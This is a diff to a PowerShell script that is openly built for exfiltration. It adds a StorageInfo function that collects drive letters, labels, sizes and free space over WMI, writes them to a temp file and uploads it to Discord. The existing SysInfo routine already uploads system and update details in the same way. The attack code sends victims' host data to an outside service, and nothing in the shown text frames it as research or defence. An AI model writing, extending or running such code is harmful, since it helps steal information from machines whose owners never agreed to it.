@@ -48,6 +48,9 @@ function Exfiltration {
 
     # Call SysInfo function
     SysInfo
+
+    #Call for StorageInfo
+    StorageInfo
 }
 
 function version-av {
@@ -133,7 +136,7 @@ function SysInfo {
         RAM: $computerRam
 "@
 
-    # ... Rest of the script
+
 
     # Generate a report of updates installed on the computer
     $userDir = "C:\Temp"
@@ -155,6 +158,35 @@ function SysInfo {
     Upload-Discord -file "C:\temp\System_Informations.txt" -text "System Informations :"
 }
 
+# Function to get storage information
+function StorageInfo {
+    # Create or clear the Storage_Info.txt file
+    $storageFilePath = "C:\Temp\Storage_Info.txt"
+    Set-Content -Path $storageFilePath -Value $null
+
+    Get-WmiObject Win32_LogicalDisk | ForEach-Object {
+        $driveLetter = $_.DeviceID
+        $driveLabel = $_.VolumeName
+        $driveType = $_.DriveType
+        $driveSize = [math]::Round(($_.Size / 1GB), 2)
+        $freeSpace = [math]::Round(($_.FreeSpace / 1GB), 2)
+        $usedSpace = $driveSize - $freeSpace
+
+        $info = @"
+        Drive Letter: $driveLetter
+        Volume Label: $driveLabel
+        Drive Type: $driveType
+        Total Size: ${driveSize}GB
+        Used Space: ${usedSpace}GB
+        Free Space: ${freeSpace}GB
+"@
+        # Append information to the Storage_Info.txt file
+        Add-Content -Path $storageFilePath -Value $info
+    }
+
+    # Upload Storage_Info.txt to Discord
+    Upload-Discord -file $storageFilePath -text "Storage Information :"
+}
 
 
 # Function to delete the temporary directory
